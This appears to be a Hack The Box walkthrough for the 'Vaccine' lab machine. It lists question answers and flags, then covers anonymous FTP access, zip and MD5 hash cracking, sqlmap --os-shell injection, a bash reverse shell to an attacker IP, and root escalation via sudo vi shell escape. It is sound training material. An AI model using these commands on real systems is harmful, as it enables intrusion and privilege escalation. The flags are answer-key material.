@@ -1,0 +1,142 @@
+Hack The Box 
+Machine: Vaccine
+Part of the starting point tier 2 series
+Difficulty: Very Easy 
+Google Docs:
+
+Q1: Besides SSH and HTTP what other service is hosted on this box?
+A1: ftp
+
+Q2: This service can be configured to allow login with any password for specific username. What is that username?
+A2: Anonymous
+
+Q3: What is the name of the file downloaded over this service?
+A3: backup.zip
+
+Q4: What script comes with the Jon The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
+A4: zip2john
+
+Q5: What is the password for the admin user on the website?
+A5: qwerty789
+
+Q6: What option can be passed to sqlmap to try to get command execution via the sql injection?
+A6: –os-shell
+
+Q7: What program can the postgres user run as root using sudo?
+A7: vi
+
+Q8: Submit user flag
+A8: ec9b13ca4d6229cd5cc1e09980965bf7
+
+Q9: Submit the root flag 
+A9: dd6e058e814260bc70e9bbdef2715849
+
+Step1:
+	Run nmap on the machine to scan for open ports and service versions
+nmap -sV <target_IP>
+	Scan Results:
+		Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-23 20:28 EDT
+Nmap scan report for 10.129.245.208
+Host is up (0.056s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Here we see the answer to question one. 
+
+The hint for question 2 tells us to run Nmaps scan with default NSE scripts. We do this by simply using the -sC switch.
+nmap -sC <target_IP>
+
+We see the answer to question 2 is “Anonymous” in the scan results
+ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+We also see the answer to question 3 in the same scan
+_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+
+The answer to question 4 isn’t really found through anything on the machine it’s 
+zip2john
+
+Step2:
+	For question 5 we need to actually do something. We will use this “Anonymous” login we found for question 2 to ftp into the box and then use the get command to obtain the backup.zip file on our attack machine.
+ftp <target_IP>
+When prompted for a name enter Anonymous then just press enter to send a blank password. 
+using ls we see there is just one file, get works with ftp so just use
+get backup.zip to download the file onto our attack machine
+
+That’s all we need here so you can type exit and press enter to return to the CLI on our attack machine. 
+
+Step3: 
+	We need to crack the password for the backup.zip file we downloaded off the FTP server, as pretty much given to us by question 4 we will use zip2john. Navigate over to the directory that has our backup.zip file. From there we are going to create a hash of the zip file so we can actually crack it.
+zip2john backup.zip > new_hash.txt
+now we will just run john against the new_hash.txt using the rockyou.txt file
+locate rockyou.txt
+john –wordlist=/usr/share/wordlists/rockyou.txt new_hash.txt
+
+john tells us the password for the backup.zip file is 741852963. Use this password to unzip the backup.zip file. We see that there are 2 files index.php and style.css
+If we use cat to read the index.php file we see an md5sum for the “admin” user name. 
+2cb42f8734ea607eefed3b70af13bbd3
+
+Step4: 
+	Since md5 is an outdated hashing algorithm we can easily crack this using john. Start by storing the password into a file for john to read
+echo “2cb42f8734ea607eefed3b70af13bbd3” > Passwd.txt 
+Then use John on the Passwd.txt. This time we will want to specify that we are looking to crack the hash in the md5 format or john will probably just shoot out a lot of suggestion on what to do instead of actually cracking anything
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt Passwd.txt
+
+and we see that the password is qwerty789
+
+Step5:
+	We will now navigate over to the web server the target machine is hosting by entering it’s IP address in our web browser. We are greeted with a MegaCorp Login page since we have our admin users password we can login using their credentials. We know by the nature of question 6 that we are going to use sqlmap  with the –os-shell switch to gain our foothold. So we will have to find our session ID cookie to do so. While logged in as “admin” right click on the webpage and select inspect, at the top menu that displays click “Storage” and on the lefthand side click “Cookies” This will display a cookie that if you click on it will show you the PHPSESSID  the Value is what we are looking for, in my case it was i8hgkcgrivhk16lehe6uedv9jm
+
+Now that we have that we can use sqlmap combined with the –os-shell switch to get a foothold into the system. The command will look something like this, but you will need to change the cookie to your value
+sqlmap -u ‘http://<target_IP>/dashboard.php?search=any+query’ –cookie=”PHPSESSID=<your_cookie>” –os-shell
+
+There will be several prompts just enter Y for all of them and eventually you will be met with command line access. using whoami will reveal that we are the user “postgres”
+
+So we have a shell but it’s kind of not great and we can’t do a whole lot with it. So we will send a payload over to a listener to give ourselves a better one
+sudo nc -l <attack_IP> PORT
+
+back in our os-shell enter the following command
+bash -c "bash -i >& /dev/tcp/<attack_IP>/PORT 0>&1"
+
+We see now that our listener has a shell. We will enter the following into our listener shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo
+fg
+export TERM=xterm
+
+This will make the shell fully interactive. If we travel backwards through the directories we will eventually find a “user.txt” file containing the user flag for the challenge in the following directory
+/var/lib/postgresql$
+
+The shell is very unstable and I keep getting kicked out. So you may need to be quick from here on out. We will need to escalate our privilege but we also haven’t answered question 7 yet, if we run sudo -l we are prompted from user postgres sudo password, which unfortunately we do have at this point. So we will have to try to find it.
+
+Step 6:
+	navigating over to the /var/www/html and running ls we see several files, one of which is dashboard.php if we run cat on that file we see the postgres users password in the text
+$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+
+Since our shell sucks really bad we will try the open ssh port with this users credentials 
+ssh postgres@<target_IP>
+P@s5w0rd!
+
+We are now logged in on a more stable connection to the target machine and now that we have the users password we can run sudo -l and see the binary the user can execute with sudo privileges
+/bin/vi /etc/postgresql/11/main/pg_hba.conf
+The answer to question 7 is vi which is an older version of vim
+
+Step 7:
+	Lets execute this binary. This will open the PostgresSQL Client Authentication Configuration File with root privileges. we will use the following instructions inside of vi 
+:set shell=/bin/sh
+:shell
+whoami
+
+We see now that we are the root user
+
+From here we just enter the following commands
+cd /
+cd root
+ls
+cat root.txt
+The root flag will display
+dd6e058e814260bc70e9bbdef2715849
